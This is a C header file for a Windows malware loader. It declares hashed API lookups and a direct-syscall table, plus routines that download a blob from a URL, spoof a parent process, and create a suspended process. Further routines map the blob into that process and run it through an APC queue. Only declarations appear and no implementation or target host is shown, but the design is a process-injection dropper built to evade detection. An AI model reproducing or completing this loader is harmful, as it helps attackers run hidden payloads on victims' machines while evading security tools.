#pragma once

#include <Windows.h>
#include <wininet.h>
#include <stdio.h>

//\
#define LOG_DEBUG_MSG

#ifdef LOG_DEBUG_MSG
#define DEBUG_PRINT(fmt, ...) \
	printf("[DEBUG] (%s:%d) " fmt "\n", __FILE__, __LINE__,  ##__VA_ARGS__)

// from Debug.c
#ifdef __cplusplus
extern "C" {
#endif
	void PrintHexData(PBYTE pByteArray, SIZE_T sSize);
#ifdef __cplusplus
}
#endif
#else
#define	DEBUG_PRINT(fmt, ...) ((void)0)
#endif // !LOG_DEBUG_MSG

// -----------------------[ TYPE DEFINITIONS ]-----------------------

#define SECTION_RWX (SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE)

typedef enum _SECTION_INHERIT {
	ViewShare = 1,
	ViewUnmap = 2
} SECTION_INHERIT, * PSECTION_INHERIT;

//\
https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessw
typedef BOOL(WINAPI* fnCreateProcessW)(
	IN		OPTIONAL	LPCWSTR               lpApplicationName,
	IN	OUT	OPTIONAL	LPWSTR                lpCommandLine,
	IN		OPTIONAL    LPSECURITY_ATTRIBUTES lpProcessAttributes,
	IN		OPTIONAL    LPSECURITY_ATTRIBUTES lpThreadAttributes,
	IN					BOOL                  bInheritHandles,
	IN					DWORD                 dwCreationFlags,
	IN		OPTIONAL    LPVOID                lpEnvironment,
	IN		OPTIONAL    LPCWSTR               lpCurrentDirectory,
	IN					LPSTARTUPINFOW        lpStartupInfo,
	OUT					LPPROCESS_INFORMATION lpProcessInformation
	);

//\
https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory
typedef BOOL(WINAPI* fnWriteProcessMemory)(
	IN  HANDLE  hProcess,
	IN  LPVOID  lpBaseAddress,
	IN  LPCVOID lpBuffer,
	IN  SIZE_T  nSize,
	OUT SIZE_T* lpNumberOfBytesWritten
	);

//\
https://learn.microsoft.com/en-us/windows/win32/api/debugapi/nf-debugapi-debugactiveprocessstop
typedef BOOL(WINAPI* fnDebugActiveProcessStop)(
	IN DWORD dwProcessId
	);

//\
https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetopenw
typedef HINTERNET(WINAPI* fnInternetOpenW)(
	IN LPCWSTR lpszAgent,
	IN DWORD   dwAccessType,
	IN LPCWSTR lpszProxy,
	IN LPCWSTR lpszProxyBypass,
	IN DWORD   dwFlags
	);

//\
https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetopenurlw
typedef HINTERNET(WINAPI* fnInternetOpenUrlW)(
	IN HINTERNET hInternet,
	IN LPCWSTR   lpszUrl,
	IN LPCWSTR   lpszHeaders,
	IN DWORD     dwHeadersLength,
	IN DWORD     dwFlags,
	IN DWORD_PTR dwContext
	);

//\
https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetsetoptionw
typedef BOOL(WINAPI* fnInternetSetOptionW)(
	IN HINTERNET hInternet,
	IN DWORD     dwOption,
	IN LPVOID    lpBuffer,
	IN DWORD     dwBufferLength
	);

//\
https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetreadfile
typedef BOOL(WINAPI* fnInternetReadFile)(
	IN  HINTERNET hFile,
	OUT LPVOID    lpBuffer,
	IN  DWORD     dwNumberOfBytesToRead,
	OUT LPDWORD   lpdwNumberOfBytesRead
	);

//\
https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetclosehandle
typedef BOOL(WINAPI* fnInternetCloseHandle)(
	IN HINTERNET hInternet
	);

//\
https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-initializeprocthreadattributelist
typedef BOOL(WINAPI* fnInitializeProcThreadAttributeList)(
	OUT	OPTIONAL	LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList,
	IN					DWORD                        dwAttributeCount,
	DWORD                        dwFlags,
	IN	OUT				PSIZE_T                      lpSize
	);

//\
https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-updateprocthreadattribute
typedef BOOL(WINAPI* fnUpdateProcThreadAttribute)(
	IN	OUT				LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList,
	IN					DWORD                        dwFlags,
	IN					DWORD_PTR                    Attribute,
	IN					PVOID                        lpValue,
	IN					SIZE_T                       cbSize,
	OUT	OPTIONAL	PVOID                        lpPreviousValue,
	IN		OPTIONAL	PSIZE_T                      lpReturnSize
	);

// My representation of a Module; helps to cache some attributes
typedef struct {
	HMODULE	ModuleHandle;			// DllBase
	ULONG	ModuleHash;				// FowlerNollVoVariant1a hash of module name
	DWORD	NumberOfFunctions;		// Count of the functions in the module
	PDWORD	FunctionNameArray;		// Array of function names
	PDWORD	FunctionAddressArray;	// Array of function addresses
	PWORD	FunctionOrdinalArray;	// Array of function indexes
} WINAPI_MODULE, * PWINAPI_MODULE;

// My representation of collection of all hashed functions
typedef struct {
	fnCreateProcessW					pCreateProcessW;						// from kernel32.dll
	fnWriteProcessMemory				pWriteProcessMemory;					// from kernel32.dll
	fnDebugActiveProcessStop			pDebugActiveProcessStop;				// from kernel32.dll
	fnInternetOpenW						pInternetOpenW;							// from wininet.dll
	fnInternetOpenUrlW					pInternetOpenUrlW;						// from wininet.dll
	fnInternetSetOptionW				pInternetSetOptionW;					// from wininet.dll
	fnInternetReadFile					pInternetReadFile;						// from wininet.dll
	fnInternetCloseHandle				pInternetCloseHandle;					// from wininet.dll
	fnInitializeProcThreadAttributeList	pInitializeProcThreadAttributeList;		// from kernelbase.dll
	fnUpdateProcThreadAttribute			pUpdateProcThreadAttribute;				// from kernelbase.dll
} H_API, * PH_API;

// -----------------------[ SYSCALL HELPERS ]-----------------------

// Stores information pertaining to a syscall
typedef struct _NT_SYSCALL
{
	ULONG uSyscallHash;             // syscall hash value
	DWORD dwSSn;                    // syscall number
	PVOID pSyscallInstAddress;		// address for `syscall` instruction.
}NT_SYSCALL, * PNT_SYSCALL;

// All the syscalls that I'll need
typedef struct _SYSCALL_TABLE {
	NT_SYSCALL NtCreateSection;
	NT_SYSCALL NtMapViewOfSection;
	NT_SYSCALL NtClose;
	NT_SYSCALL NtQueueApcThread;
	NT_SYSCALL NtQuerySystemInformation;
	NT_SYSCALL NtOpenProcess;
} SYSCALL_TABLE, * PSYSCALL_TABLE;

// -----------------------[ FUNCTION DEFINITIONS ]-----------------------

#ifdef __cplusplus
extern "C" {
#endif // __cplusplus


	// From FetchBlob.c
	BOOL FetchBlob(
		IN		PH_API	pHashedApis,
		IN		LPCWSTR	lpszUrl,
		OUT		PBYTE* ppBlob,
		OUT		PSIZE_T	psBlobSize
	);

	// From Resolvers.c
	HMODULE GetModuleHandleH(
		IN	ULONG	uModuleHash
	);

	// From CreateProcess.c
	BOOL GetPsuedoParentProcess(
		IN	PSYSCALL_TABLE	pSyscallTable,
		IN	ULONG			uParentProcNameHash,
		OUT	PHANDLE			phProcess
	);

	BOOL CreateSuspendedProcess(
		IN	PH_API	pHashedApis,
		IN	LPCWSTR	lpszProcessName,
		IN	HANDLE	hParentProcess,
		OUT	PHANDLE	phProcess,
		OUT	PHANDLE	phThread,
		OUT	PDWORD	pdwProcessID
	);

	// From SetupRun.c
	BOOL CopyBlob(
		IN	PSYSCALL_TABLE	pSyscallTable,
		IN	HANDLE			hProcess,
		IN	PBYTE			pBlob,
		IN	SIZE_T			sBlobSize,
		OUT	PBYTE* ppBlobCopyAddress
	);

	BOOL ScheduleRun(
		IN	PSYSCALL_TABLE	pSyscallTable,
		IN	HANDLE			hThread,
		IN	PBYTE			pBlobAddress
	);

#ifdef __cplusplus
}
#endif // __cplusplus